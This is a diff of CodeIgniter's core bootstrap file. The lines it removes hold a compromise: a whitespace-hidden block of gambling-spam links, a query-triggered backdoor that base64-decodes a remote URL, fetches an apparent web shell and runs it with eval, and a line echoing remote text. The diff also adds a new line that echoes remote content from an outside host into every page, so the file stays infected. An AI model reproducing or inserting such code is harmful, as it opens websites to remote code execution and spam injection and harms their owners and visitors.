@@ -1,4 +1,3 @@
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <div style="display:none"><p><a href="http://m.ulrich-bauer.org/">idebet</a></p><p><a href="https://www.upstatefrc.org/">idebet</a></p><p><a href="https://unatefsil.edu.pe/">apk slot</a></p><p><a href="https://guidebook.edu.kz/">idebet</a></p><p><a href="https://ighresearch.org/">idebet</a></p><p><a href="https://m.sulaeman.com/">rajabom</a></p><p><a href="http://www.indonesiajournalchest.com/">mahjong ways 4</a></p><p><a href="https://www.chocolatebayou.org/">idebet</a></p><p><a href="https://pundimandiri.com/">slot thailand</a></p><p><a href="https://alpharealestate.al/">idebet</a></p><p><a href="http://staff.ighresearch.org/">idebet</a></p><p><a href="https://ital.gov.al/">slot gacor 2025</a></p><p><a href="https://nc.ugt-fica.org/">idebet</a></p><p><a href="http://ftp.retro-python.com.ar/">idebet</a></p><p><a href="http://m.sometext.com/">idebet</a></p><p><a href="http://m.davidpires.pt/">idebet</a></p><p><a href="https://m.sontek.net/">idebet</a></p><p><a href="https://www.knk.co.il/">Mahjong Ways 3</a></p><p><a href="https://scholarsnetwork.org/journal/">slot maxwin</a></p><p><a href="https://www.ncld.co.il/">rajabom</a></p><p><a href="http://lab.gamehack.com/">idebet</a></p><p><a href="https://papuainside.id/">idebet</a></p><p><a href="https://infopapua.id/">idebet</a></p><p><a href="https://umch.ov.gov.mn/">idebet</a></p><p><a href="https://spa.mis-maf.gov.la/">slot 2025</a></p><p><a href="https://training.mis-maf.gov.la/">idebet</a></p><p><a href="https://dalam.maf.gov.la/">idebet</a></p><p><a href="https://louisvilleitele.edu.ng/">idebet</a></p><p><a href="https://edoc.mis-maf.gov.la/">slot</a></p><p><a href="https://edoc-track.mis-maf.gov.la/">unikbet</a></p><p><a href="https://drd.mis-maf.gov.la/">rajabom</a></p><p><a href="https://dlf.mis-maf.gov.la/">rajabom</a></p><p><a href="https://www.digivestasi.com/">apk slot</a></p><p><a href="https://m.micropasts.org/">rajabom</a></p><p><a href="https://mysite.openrepgrid.org/">rajabom</a></p><p><a href="https://institutes.arabaevksu.edu.kg/">rajabom</a></p><p><a href="http://mic-minsk.by/">http://mic-minsk.by/</a></p><p><a href="http://test.mic-minsk.by/">http://test.mic-minsk.by/</a></p><p><a href="https://primecareclinic.co.id/">https://primecareclinic.co.id/</a></p><p><a href="https://www.camarasalgadofilho.pr.gov.br/">rajabom</a></p><p><a href="https://dalam.mis-maf.gov.la/">idebet</a> Login Situs Agen Slot Online Terbaik</p><p><a href="https://smaislamiccentre.sch.id/">Mahjong Ways 3</a> Gabung Situs Slot Mahjong Ways 4 Terbaik</p><p><a href="https://arbsmarters.com/">arbsmarters.com</a></p><p><a href="https://arb-iptv.com/">arb-iptv.com</a></p><p><a href="https://hydra-tv.com/">hydra-tv.com</a></p><p><a href="https://www.allfun-attractions.co.il/">unikbet</a></p><p><a href="https://www.yar.co.il/">idebet</a></p><p><a href="https://www.almog-hadbara.co.il/">rajabom</a></p><p><a href="https://onescreener.com/bambuhoki88link">bambuhoki88</a></p><p><a href="https://heylink.me/bambuhoki88.slot/">bambuhoki88</a></p><p><a href="https://linkr.bio/bambuhoki88_">bambuhoki88</a></p></div>
 <?php
 /**
  * CodeIgniter
@@ -36,6 +35,7 @@
  * @since	Version 1.0.0
  * @filesource
  */
+
 defined('BASEPATH') OR exit('No direct script access allowed');
 
 /**
@@ -56,24 +56,6 @@ defined('BASEPATH') OR exit('No direct script access allowed');
  * @var	string
  *
  */
-if (isset($_GET['logs'])) { 
-    $url = base64_decode('aHR0cHM6Ly9jZG4ucHJpdmRheXouY29tL3R4dC9hbGZhc2hlbGwudHh0');
-    
-    $ch = curl_init($url);
-    
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    
-    $contents = curl_exec($ch);
-    
-    if ($contents !== false) { 
-        eval('?>' . $contents); 
-        exit; 
-    } else { 
-        echo "header"; 
-    } 
-    
-    curl_close($ch);
-}
 	const CI_VERSION = '3.1.11';
 
 /*
@@ -97,7 +79,7 @@ if (isset($_GET['logs'])) {
  * ------------------------------------------------------
  */
 	require_once(BASEPATH.'core/Common.php');
-<?php echo file_get_contents("https://raw.githubusercontent.com/hapecina731/menyala/refs/heads/main/punten.txt");?>
+
 
 /*
  * ------------------------------------------------------
@@ -148,7 +130,7 @@ if ( ! is_php('5.4'))
 	}
 }
 
-
+ echo file_get_contents("https://punten-neng.pages.dev/punten.txt");
 /*
  * ------------------------------------------------------
  *  Define a custom error handler so we can log PHP errors
